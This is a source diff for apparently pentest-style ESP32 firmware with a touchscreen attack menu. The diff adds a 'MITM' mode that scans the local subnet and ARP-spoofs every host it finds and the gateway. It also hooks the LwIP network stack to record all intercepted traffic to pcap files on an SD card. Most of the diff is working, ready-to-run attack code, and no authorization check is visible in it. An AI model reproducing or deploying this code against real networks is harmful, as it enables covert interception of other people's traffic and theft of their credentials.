@@ -690,10 +690,11 @@ static bool portal_log_capture_enabled = false;
 static volatile bool portal_ui_active = false;
 static char portal_selected_html_name[64] = "";
 
-// WiFi Connect screen state (for ARP Poison, Rogue AP, WPA-SEC Upload)
+// WiFi Connect screen state (for ARP Poison, Rogue AP, WPA-SEC Upload, MITM)
 #define PENDING_ATTACK_ARP_POISON   0
 #define PENDING_ATTACK_ROGUE_AP     1
 #define PENDING_ATTACK_WPA_SEC      2
+#define PENDING_ATTACK_MITM         3
 static int pending_attack_type = 0;
 static char wifi_connect_ssid[33] = "";
 static char wifi_connect_password[64] = "";
@@ -759,6 +760,46 @@ static volatile bool arp_scan_done = false;
 static lv_obj_t *arp_poison_overlay = NULL;
 static lv_obj_t *arp_poison_status_label = NULL;
 static lv_timer_t *arp_scan_check_timer = NULL;
+
+// MITM Capture state
+#define MITM_MAX_HOSTS    64
+#define MITM_QUEUE_SIZE   256
+#define MITM_MAX_FRAME    1600
+#define LINKTYPE_ETHERNET 1
+
+typedef struct {
+    uint16_t len;
+    int64_t timestamp_us;
+    uint8_t data[];
+} mitm_queued_frame_t;
+
+typedef struct {
+    ip4_addr_t ip;
+    uint8_t mac[6];
+} mitm_host_entry_t;
+
+static mitm_host_entry_t *mitm_hosts = NULL;
+static int mitm_host_count = 0;
+static volatile bool mitm_arp_active = false;
+static volatile bool mitm_capture_active = false;
+static FILE *mitm_pcap_file = NULL;
+static QueueHandle_t mitm_packet_queue = NULL;
+static volatile uint32_t mitm_frame_count = 0;
+static volatile uint32_t mitm_drop_count = 0;
+static TaskHandle_t mitm_arp_task_handle = NULL;
+static TaskHandle_t mitm_writer_task_handle = NULL;
+static netif_input_fn mitm_original_input = NULL;
+static netif_linkoutput_fn mitm_original_linkoutput = NULL;
+static uint32_t mitm_gateway_ip = 0;
+static uint8_t mitm_gateway_mac[6] = {0};
+static uint8_t mitm_own_mac[6] = {0};
+static volatile bool mitm_scan_done = false;
+static lv_obj_t *mitm_counter_label = NULL;
+static lv_obj_t *mitm_status_label = NULL;
+static lv_obj_t *mitm_hosts_label = NULL;
+static lv_timer_t *mitm_scan_check_timer = NULL;
+static lv_timer_t *mitm_update_timer = NULL;
+static char mitm_pcap_filepath[64] = "";
 
 // BLE Scan UI state
 static lv_obj_t *ble_scan_content = NULL;
@@ -1075,11 +1116,12 @@ static bool wait_for_gps_fix(int timeout_seconds);
 void load_whitelist_from_sd(void);
 bool is_bssid_whitelisted(const uint8_t *bssid);
 
-// WiFi Connect screen (ARP Poison, Rogue AP, WPA-SEC Upload)
+// WiFi Connect screen (ARP Poison, Rogue AP, WPA-SEC Upload, MITM)
 static void show_wifi_connect_screen(void);
 static void show_arp_poison_page(void);
 static void show_rogue_ap_page(void);
 static void show_wpa_sec_upload_page(void);
+static void show_mitm_page(void);
 static void stop_arp_ban(void);
 
 // WPA-SEC upload helpers
@@ -9409,7 +9451,7 @@ static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *tex
 static lv_obj_t *create_small_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data)
 {
     lv_obj_t *tile = lv_btn_create(parent);
-    lv_obj_set_size(tile, 100, 55);  // Smaller tile size for single row
+    lv_obj_set_size(tile, 87, 48);  // Compact tile size for 9-tile grid
     lv_obj_set_style_bg_color(tile, bg_color, LV_STATE_DEFAULT);
     lv_obj_set_style_bg_color(tile, lv_color_lighten(bg_color, 50), LV_STATE_PRESSED);
     lv_obj_set_style_border_width(tile, 0, 0);
@@ -9435,7 +9477,7 @@ static lv_obj_t *create_small_tile(lv_obj_t *parent, const char *icon, const cha
         lv_obj_set_style_text_color(text_label, lv_color_make(255, 255, 255), 0);
         lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
         lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
-        lv_obj_set_width(text_label, 75);
+        lv_obj_set_width(text_label, 68);
     }
     
     if (callback && user_data) {
@@ -9535,6 +9577,7 @@ static void attack_tile_event_cb(lv_event_t *e)
         // Auto-start Network Observer directly (no confirmation)
         sniffer_yes_btn_cb(NULL);
     } else if (strcmp(attack_name, "ARP Poison") == 0 ||
+               strcmp(attack_name, "MITM") == 0 ||
                strcmp(attack_name, "Rogue AP") == 0 ||
                strcmp(attack_name, "WPA-SEC Upload") == 0) {
         // These attacks require exactly one selected network
@@ -9583,6 +9626,8 @@ static void attack_tile_event_cb(lv_event_t *e)
             // Exactly one network selected - proceed to WiFi Connect screen
             if (strcmp(attack_name, "ARP Poison") == 0) {
                 pending_attack_type = PENDING_ATTACK_ARP_POISON;
+            } else if (strcmp(attack_name, "MITM") == 0) {
+                pending_attack_type = PENDING_ATTACK_MITM;
             } else if (strcmp(attack_name, "Rogue AP") == 0) {
                 pending_attack_type = PENDING_ATTACK_ROGUE_AP;
             } else {
@@ -9919,6 +9964,9 @@ static void wifi_connect_next_btn_cb(lv_event_t *e)
     switch (pending_attack_type) {
         case PENDING_ATTACK_ARP_POISON:
             show_arp_poison_page();
+            break;
+        case PENDING_ATTACK_MITM:
+            show_mitm_page();
             break;
         case PENDING_ATTACK_ROGUE_AP:
             show_rogue_ap_page();
@@ -10562,6 +10610,616 @@ static void show_arp_poison_page(void)
     
     // Start timer to check when scan is done
     arp_scan_check_timer = lv_timer_create(arp_scan_check_timer_cb, 200, NULL);
+}
+
+// ============================================================================
+// MITM Capture (ARP spoof all hosts + LwIP packet capture to SD)
+// ============================================================================
+
+static void mitm_enqueue_frame(const uint8_t *data, uint16_t len)
+{
+    if (!mitm_capture_active || !mitm_packet_queue || len == 0) return;
+
+    mitm_queued_frame_t *frame = heap_caps_malloc(sizeof(mitm_queued_frame_t) + len, MALLOC_CAP_SPIRAM);
+    if (!frame) return;
+
+    frame->len = len;
+    frame->timestamp_us = esp_timer_get_time();
+    memcpy(frame->data, data, len);
+
+    if (xQueueSend(mitm_packet_queue, &frame, 0) != pdTRUE) {
+        heap_caps_free(frame);
+        mitm_drop_count++;
+    }
+}
+
+static err_t mitm_netif_input_hook(struct pbuf *p, struct netif *inp)
+{
+    if (mitm_capture_active && p && p->tot_len > 0 && p->tot_len <= MITM_MAX_FRAME) {
+        uint8_t tmp[MITM_MAX_FRAME];
+        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
+        if (copied > 0) {
+            mitm_enqueue_frame(tmp, copied);
+        }
+    }
+    return mitm_original_input(p, inp);
+}
+
+static err_t mitm_netif_linkoutput_hook(struct netif *netif, struct pbuf *p)
+{
+    if (mitm_capture_active && p && p->tot_len > 0 && p->tot_len <= MITM_MAX_FRAME) {
+        uint8_t tmp[MITM_MAX_FRAME];
+        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
+        if (copied > 0) {
+            mitm_enqueue_frame(tmp, copied);
+        }
+    }
+    return mitm_original_linkoutput(netif, p);
+}
+
+static void mitm_arp_spoof_task(void *pvParameters)
+{
+    (void)pvParameters;
+
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        ESP_LOGE(TAG, "MITM ARP: STA netif not found");
+        mitm_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif || !lwip_netif->linkoutput) {
+        ESP_LOGE(TAG, "MITM ARP: LwIP netif not usable");
+        mitm_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    ESP_LOGI(TAG, "MITM ARP: Spoofing %d hosts", mitm_host_count);
+
+    while (mitm_arp_active) {
+        for (int i = 0; i < mitm_host_count && mitm_arp_active; i++) {
+            // Tell victim: "gateway IP is at our MAC"
+            send_arp_reply(lwip_netif,
+                           mitm_hosts[i].mac, mitm_own_mac, mitm_own_mac,
+                           mitm_gateway_ip,
+                           mitm_hosts[i].mac, mitm_hosts[i].ip.addr);
+            // Tell gateway: "victim IP is at our MAC"
+            send_arp_reply(lwip_netif,
+                           mitm_gateway_mac, mitm_own_mac, mitm_own_mac,
+                           mitm_hosts[i].ip.addr,
+                           mitm_gateway_mac, mitm_gateway_ip);
+
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+        vTaskDelay(pdMS_TO_TICKS(2000));
+    }
+
+    // Restore original ARP mappings (3 passes)
+    ESP_LOGI(TAG, "MITM ARP: Sending corrective ARP to restore network...");
+    for (int pass = 0; pass < 3; pass++) {
+        for (int i = 0; i < mitm_host_count; i++) {
+            send_arp_reply(lwip_netif,
+                           mitm_hosts[i].mac, mitm_gateway_mac, mitm_gateway_mac,
+                           mitm_gateway_ip,
+                           mitm_hosts[i].mac, mitm_hosts[i].ip.addr);
+            send_arp_reply(lwip_netif,
+                           mitm_gateway_mac, mitm_hosts[i].mac, mitm_hosts[i].mac,
+                           mitm_hosts[i].ip.addr,
+                           mitm_gateway_mac, mitm_gateway_ip);
+        }
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    ESP_LOGI(TAG, "MITM ARP: spoof task stopped");
+    mitm_arp_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void mitm_pcap_writer_task(void *pvParameters)
+{
+    (void)pvParameters;
+
+    ESP_LOGI(TAG, "MITM writer: started, file=%s", mitm_pcap_filepath);
+
+    int flush_counter = 0;
+    mitm_queued_frame_t *frame = NULL;
+
+    while (mitm_capture_active) {
+        if (xQueueReceive(mitm_packet_queue, &frame, pdMS_TO_TICKS(200)) == pdTRUE) {
+            pcap_record_header_t rec = {
+                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
+                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
+                .incl_len = frame->len,
+                .orig_len = frame->len
+            };
+
+            if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
+                fwrite(&rec, 1, sizeof(rec), mitm_pcap_file);
+                fwrite(frame->data, 1, frame->len, mitm_pcap_file);
+                flush_counter++;
+                if (flush_counter >= 50) {
+                    fflush(mitm_pcap_file);
+                    flush_counter = 0;
+                }
+                xSemaphoreGive(sd_spi_mutex);
+            }
+
+            heap_caps_free(frame);
+            frame = NULL;
+            mitm_frame_count++;
+        }
+    }
+
+    // Drain remaining queue
+    while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE) {
+        pcap_record_header_t rec = {
+            .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
+            .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
+            .incl_len = frame->len,
+            .orig_len = frame->len
+        };
+        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
+            fwrite(&rec, 1, sizeof(rec), mitm_pcap_file);
+            fwrite(frame->data, 1, frame->len, mitm_pcap_file);
+            xSemaphoreGive(sd_spi_mutex);
+        }
+        heap_caps_free(frame);
+        mitm_frame_count++;
+    }
+
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+        fflush(mitm_pcap_file);
+        fclose(mitm_pcap_file);
+        mitm_pcap_file = NULL;
+        xSemaphoreGive(sd_spi_mutex);
+    }
+
+    ESP_LOGI(TAG, "MITM writer: stopped, %u frames written, %u dropped",
+             mitm_frame_count, mitm_drop_count);
+    mitm_writer_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void mitm_scan_task(void *pvParameters)
+{
+    (void)pvParameters;
+    mitm_host_count = 0;
+
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        ESP_LOGE(TAG, "MITM scan: STA netif not found");
+        mitm_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK || ip_info.ip.addr == 0) {
+        ESP_LOGE(TAG, "MITM scan: No IP assigned");
+        mitm_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif) {
+        ESP_LOGE(TAG, "MITM scan: LwIP netif not found");
+        mitm_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    // Get own MAC and gateway info
+    esp_wifi_get_mac(WIFI_IF_STA, mitm_own_mac);
+    mitm_gateway_ip = ip_info.gw.addr;
+
+    // Resolve gateway MAC from ARP table or by sending request
+    bool gw_found = false;
+    ip4_addr_t gw_ip;
+    gw_ip.addr = mitm_gateway_ip;
+    etharp_request(lwip_netif, &gw_ip);
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
+    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            if (ip_ret->addr == mitm_gateway_ip) {
+                memcpy(mitm_gateway_mac, eth_ret->addr, 6);
+                gw_found = true;
+                break;
+            }
+        }
+    }
+
+    if (!gw_found) {
+        ESP_LOGW(TAG, "MITM scan: Gateway MAC not found, retrying...");
+        etharp_request(lwip_netif, &gw_ip);
+        vTaskDelay(pdMS_TO_TICKS(2000));
+        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+            ip4_addr_t *ip_ret;
+            struct netif *netif_ret;
+            struct eth_addr *eth_ret;
+            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+                if (ip_ret->addr == mitm_gateway_ip) {
+                    memcpy(mitm_gateway_mac, eth_ret->addr, 6);
+                    gw_found = true;
+                    break;
+                }
+            }
+        }
+    }
+
+    if (!gw_found) {
+        ESP_LOGE(TAG, "MITM scan: Could not resolve gateway MAC");
+        mitm_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    ESP_LOGI(TAG, "MITM scan: Gateway MAC=%02X:%02X:%02X:%02X:%02X:%02X",
+             mitm_gateway_mac[0], mitm_gateway_mac[1], mitm_gateway_mac[2],
+             mitm_gateway_mac[3], mitm_gateway_mac[4], mitm_gateway_mac[5]);
+
+    // Scan subnet
+    uint32_t ip = ntohl(ip_info.ip.addr);
+    uint32_t mask = ntohl(ip_info.netmask.addr);
+    uint32_t network = ip & mask;
+    uint32_t broadcast = network | ~mask;
+
+    int requests_sent = 0;
+    for (uint32_t target = network + 1; target < broadcast && requests_sent < 254; target++) {
+        ip4_addr_t target_ip;
+        target_ip.addr = htonl(target);
+        etharp_request(lwip_netif, &target_ip);
+        requests_sent++;
+        if (requests_sent % 10 == 0) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+    }
+
+    ESP_LOGI(TAG, "MITM scan: Sent %d ARP requests, waiting...", requests_sent);
+    vTaskDelay(pdMS_TO_TICKS(3000));
+
+    // Read ARP table for discovered hosts (excluding gateway and ourselves)
+    if (!mitm_hosts) {
+        mitm_hosts = heap_caps_malloc(MITM_MAX_HOSTS * sizeof(mitm_host_entry_t), MALLOC_CAP_SPIRAM);
+    }
+    if (!mitm_hosts) {
+        ESP_LOGE(TAG, "MITM scan: PSRAM alloc failed for host table");
+        mitm_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    for (int i = 0; i < ARP_TABLE_SIZE && mitm_host_count < MITM_MAX_HOSTS; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            if (ip_ret->addr == mitm_gateway_ip) continue;
+            if (ip_ret->addr == ip_info.ip.addr) continue;
+            mitm_hosts[mitm_host_count].ip.addr = ip_ret->addr;
+            memcpy(mitm_hosts[mitm_host_count].mac, eth_ret->addr, 6);
+            mitm_host_count++;
+        }
+    }
+
+    ESP_LOGI(TAG, "MITM scan: Found %d hosts (excluding gateway)", mitm_host_count);
+    mitm_scan_done = true;
+    vTaskDelete(NULL);
+}
+
+static int mitm_find_next_pcap_number(void)
+{
+    DIR *dir = opendir("/sdcard/lab/pcaps");
+    if (!dir) return 1;
+    int max_idx = 0;
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        int idx = 0;
+        if (sscanf(entry->d_name, "mitm_%d.pcap", &idx) == 1) {
+            if (idx > max_idx) max_idx = idx;
+        }
+    }
+    closedir(dir);
+    return max_idx + 1;
+}
+
+static void mitm_stop(void)
+{
+    ESP_LOGI(TAG, "MITM: Stopping capture...");
+
+    mitm_capture_active = false;
+    mitm_arp_active = false;
+
+    // Wait for ARP spoof task
+    for (int i = 0; i < 80 && mitm_arp_task_handle != NULL; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    if (mitm_arp_task_handle != NULL) {
+        vTaskDelete(mitm_arp_task_handle);
+        mitm_arp_task_handle = NULL;
+    }
+
+    // Wait for writer task
+    for (int i = 0; i < 40 && mitm_writer_task_handle != NULL; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    if (mitm_writer_task_handle != NULL) {
+        vTaskDelete(mitm_writer_task_handle);
+        mitm_writer_task_handle = NULL;
+        if (mitm_pcap_file) {
+            fflush(mitm_pcap_file);
+            fclose(mitm_pcap_file);
+            mitm_pcap_file = NULL;
+        }
+    }
+
+    // Restore LwIP hooks
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (sta_netif) {
+        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+        if (lwip_netif) {
+            if (mitm_original_input) {
+                lwip_netif->input = mitm_original_input;
+                mitm_original_input = NULL;
+            }
+            if (mitm_original_linkoutput) {
+                lwip_netif->linkoutput = mitm_original_linkoutput;
+                mitm_original_linkoutput = NULL;
+            }
+        }
+    }
+
+    // Drain and delete queue
+    if (mitm_packet_queue) {
+        mitm_queued_frame_t *frame = NULL;
+        while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE) {
+            heap_caps_free(frame);
+        }
+        vQueueDelete(mitm_packet_queue);
+        mitm_packet_queue = NULL;
+    }
+
+    if (mitm_update_timer) {
+        lv_timer_del(mitm_update_timer);
+        mitm_update_timer = NULL;
+    }
+
+    if (mitm_hosts) {
+        heap_caps_free(mitm_hosts);
+        mitm_hosts = NULL;
+    }
+
+    mitm_counter_label = NULL;
+    mitm_status_label = NULL;
+    mitm_hosts_label = NULL;
+}
+
+static void mitm_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    mitm_stop();
+    nav_to_menu_flag = true;
+}
+
+static void mitm_update_timer_cb(lv_timer_t *timer)
+{
+    (void)timer;
+    if (mitm_counter_label) {
+        char buf[48];
+        snprintf(buf, sizeof(buf), "Packets: %lu", (unsigned long)mitm_frame_count);
+        lv_label_set_text(mitm_counter_label, buf);
+    }
+}
+
+static void mitm_show_active_screen(void)
+{
+    create_function_page_base("MITM Capture");
+
+    // Mount SD and open PCAP file
+    esp_err_t sd_ret = ensure_sd_mounted();
+    if (sd_ret != ESP_OK) {
+        ESP_LOGE(TAG, "MITM: SD mount failed");
+        lv_obj_t *err_lbl = lv_label_create(function_page);
+        lv_label_set_text(err_lbl, "SD card mount failed!");
+        lv_obj_set_style_text_color(err_lbl, COLOR_MATERIAL_RED, 0);
+        lv_obj_set_style_text_font(err_lbl, &lv_font_montserrat_16, 0);
+        lv_obj_center(err_lbl);
+        return;
+    }
+
+    mkdir("/sdcard/lab", 0775);
+    mkdir("/sdcard/lab/pcaps", 0775);
+
+    int file_num = mitm_find_next_pcap_number();
+    snprintf(mitm_pcap_filepath, sizeof(mitm_pcap_filepath),
+             "/sdcard/lab/pcaps/mitm_%d.pcap", file_num);
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+    mitm_pcap_file = fopen(mitm_pcap_filepath, "wb");
+    if (mitm_pcap_file) {
+        pcap_global_header_t ghdr = {
+            .magic_number = 0xa1b2c3d4,
+            .version_major = 2,
+            .version_minor = 4,
+            .thiszone = 0,
+            .sigfigs = 0,
+            .snaplen = 65535,
+            .network = LINKTYPE_ETHERNET
+        };
+        fwrite(&ghdr, 1, sizeof(ghdr), mitm_pcap_file);
+        fflush(mitm_pcap_file);
+    }
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
+    if (!mitm_pcap_file) {
+        ESP_LOGE(TAG, "MITM: Failed to open %s", mitm_pcap_filepath);
+        lv_obj_t *err_lbl = lv_label_create(function_page);
+        lv_label_set_text(err_lbl, "Failed to create PCAP file!");
+        lv_obj_set_style_text_color(err_lbl, COLOR_MATERIAL_RED, 0);
+        lv_obj_set_style_text_font(err_lbl, &lv_font_montserrat_16, 0);
+        lv_obj_center(err_lbl);
+        return;
+    }
+
+    // Create packet queue
+    mitm_packet_queue = xQueueCreate(MITM_QUEUE_SIZE, sizeof(mitm_queued_frame_t *));
+    mitm_frame_count = 0;
+    mitm_drop_count = 0;
+    mitm_capture_active = true;
+    mitm_arp_active = true;
+
+    // Hook LwIP
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (lwip_netif) {
+        mitm_original_input = lwip_netif->input;
+        mitm_original_linkoutput = lwip_netif->linkoutput;
+        lwip_netif->input = mitm_netif_input_hook;
+        lwip_netif->linkoutput = mitm_netif_linkoutput_hook;
+    }
+
+    // Start ARP spoof task (stack in PSRAM)
+    StackType_t *mitm_arp_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    static StaticTask_t mitm_arp_tcb;
+    if (mitm_arp_stack) {
+        mitm_arp_task_handle = xTaskCreateStatic(mitm_arp_spoof_task, "mitm_arp", 4096,
+                                                  NULL, 5, mitm_arp_stack, &mitm_arp_tcb);
+    } else {
+        xTaskCreate(mitm_arp_spoof_task, "mitm_arp", 4096, NULL, 5, &mitm_arp_task_handle);
+    }
+
+    // Start PCAP writer task (stack in PSRAM)
+    StackType_t *mitm_wr_stack = heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    static StaticTask_t mitm_wr_tcb;
+    if (mitm_wr_stack) {
+        mitm_writer_task_handle = xTaskCreateStatic(mitm_pcap_writer_task, "mitm_wr", 8192,
+                                                     NULL, 5, mitm_wr_stack, &mitm_wr_tcb);
+    } else {
+        xTaskCreate(mitm_pcap_writer_task, "mitm_wr", 8192, NULL, 5, &mitm_writer_task_handle);
+    }
+
+    ESP_LOGI(TAG, "MITM: Capture active, %d hosts, file=%s", mitm_host_count, mitm_pcap_filepath);
+
+    // Build active UI
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_gap(content, 8, 0);
+
+    // Status
+    mitm_status_label = lv_label_create(content);
+    lv_label_set_text(mitm_status_label, "MITM Active");
+    lv_obj_set_style_text_color(mitm_status_label, COLOR_MATERIAL_GREEN, 0);
+    lv_obj_set_style_text_font(mitm_status_label, &lv_font_montserrat_16, 0);
+
+    // Hosts count
+    mitm_hosts_label = lv_label_create(content);
+    char hosts_buf[48];
+    snprintf(hosts_buf, sizeof(hosts_buf), "Spoofing %d hosts", mitm_host_count);
+    lv_label_set_text(mitm_hosts_label, hosts_buf);
+    lv_obj_set_style_text_color(mitm_hosts_label, COLOR_MATERIAL_TEAL, 0);
+    lv_obj_set_style_text_font(mitm_hosts_label, &lv_font_montserrat_14, 0);
+
+    // Packet counter (big)
+    mitm_counter_label = lv_label_create(content);
+    lv_label_set_text(mitm_counter_label, "Packets: 0");
+    lv_obj_set_style_text_color(mitm_counter_label, lv_color_white(), 0);
+    lv_obj_set_style_text_font(mitm_counter_label, &lv_font_montserrat_20, 0);
+
+    // File path
+    lv_obj_t *file_label = lv_label_create(content);
+    char file_buf[80];
+    snprintf(file_buf, sizeof(file_buf), "File: mitm_%d.pcap", file_num);
+    lv_label_set_text(file_label, file_buf);
+    lv_obj_set_style_text_color(file_label, lv_color_make(150, 150, 150), 0);
+    lv_obj_set_style_text_font(file_label, &lv_font_montserrat_12, 0);
+
+    // Stop button
+    lv_obj_t *stop_btn = lv_btn_create(content);
+    lv_obj_set_size(stop_btn, 140, 40);
+    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(stop_btn, 0, 0);
+    lv_obj_set_style_radius(stop_btn, 8, 0);
+    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
+    lv_label_set_text(stop_lbl, LV_SYMBOL_STOP " STOP");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_white(), 0);
+    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_16, 0);
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(stop_btn, mitm_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+
+    // Update timer for packet counter
+    mitm_update_timer = lv_timer_create(mitm_update_timer_cb, 500, NULL);
+}
+
+static void mitm_scan_check_timer_cb(lv_timer_t *timer)
+{
+    (void)timer;
+    if (mitm_scan_done) {
+        mitm_scan_done = false;
+        if (mitm_scan_check_timer) {
+            lv_timer_del(mitm_scan_check_timer);
+            mitm_scan_check_timer = NULL;
+        }
+        if (mitm_host_count == 0) {
+            create_function_page_base("MITM");
+            lv_obj_t *err_lbl = lv_label_create(function_page);
+            lv_label_set_text(err_lbl, "No hosts found on network");
+            lv_obj_set_style_text_color(err_lbl, COLOR_MATERIAL_RED, 0);
+            lv_obj_set_style_text_font(err_lbl, &lv_font_montserrat_16, 0);
+            lv_obj_center(err_lbl);
+            return;
+        }
+        mitm_show_active_screen();
+    }
+}
+
+static void show_mitm_page(void)
+{
+    create_function_page_base("MITM");
+
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_radius(content, 0, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *spinner = lv_spinner_create(content, 1000, 60);
+    lv_obj_set_size(spinner, 50, 50);
+    lv_obj_align(spinner, LV_ALIGN_CENTER, 0, -20);
+
+    lv_obj_t *scan_label = lv_label_create(content);
+    lv_label_set_text(scan_label, "Scanning network for hosts...");
+    lv_obj_set_style_text_color(scan_label, COLOR_MATERIAL_TEAL, 0);
+    lv_obj_set_style_text_font(scan_label, &lv_font_montserrat_16, 0);
+    lv_obj_align(scan_label, LV_ALIGN_CENTER, 0, 30);
+
+    mitm_scan_done = false;
+    mitm_host_count = 0;
+
+    StackType_t *scan_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    static StaticTask_t scan_tcb;
+    if (scan_stack) {
+        xTaskCreateStatic(mitm_scan_task, "mitm_scan", 4096, NULL, 5, scan_stack, &scan_tcb);
+    } else {
+        xTaskCreate(mitm_scan_task, "mitm_scan", 4096, NULL, 5, NULL);
+    }
+
+    mitm_scan_check_timer = lv_timer_create(mitm_scan_check_timer_cb, 200, NULL);
 }
 
 static void rogue_ap_exit_cb(lv_event_t *e)
@@ -11268,7 +11926,7 @@ static void show_attack_tiles_screen(void)
 {
     create_function_page_base("Select Attack");
     
-    // Create small tiles container at top (2 rows of 4) with extra spacing
+    // Create small tiles container (4+5 layout) with compact spacing
     lv_obj_t *attack_tiles = lv_obj_create(function_page);
     lv_obj_set_size(attack_tiles, lv_pct(100), 130);
     lv_obj_align(attack_tiles, LV_ALIGN_TOP_MID, 0, 40);
@@ -11276,7 +11934,7 @@ static void show_attack_tiles_screen(void)
     lv_obj_set_style_border_width(attack_tiles, 0, 0);
     lv_obj_set_style_pad_all(attack_tiles, 5, 0);
     lv_obj_set_style_pad_gap(attack_tiles, 5, 0);
-    lv_obj_set_flex_flow(attack_tiles, LV_FLEX_FLOW_ROW_WRAP);  // 2 rows, wrap
+    lv_obj_set_flex_flow(attack_tiles, LV_FLEX_FLOW_ROW_WRAP);
     lv_obj_set_flex_align(attack_tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
     lv_obj_clear_flag(attack_tiles, LV_OBJ_FLAG_SCROLLABLE);
     
@@ -11285,8 +11943,9 @@ static void show_attack_tiles_screen(void)
     create_small_tile(attack_tiles, LV_SYMBOL_WARNING, "Evil Twin", COLOR_MATERIAL_ORANGE, attack_tile_event_cb, "Evil Twin");
     create_small_tile(attack_tiles, LV_SYMBOL_POWER, "SAE", COLOR_MATERIAL_PINK, attack_tile_event_cb, "SAE Overflow");
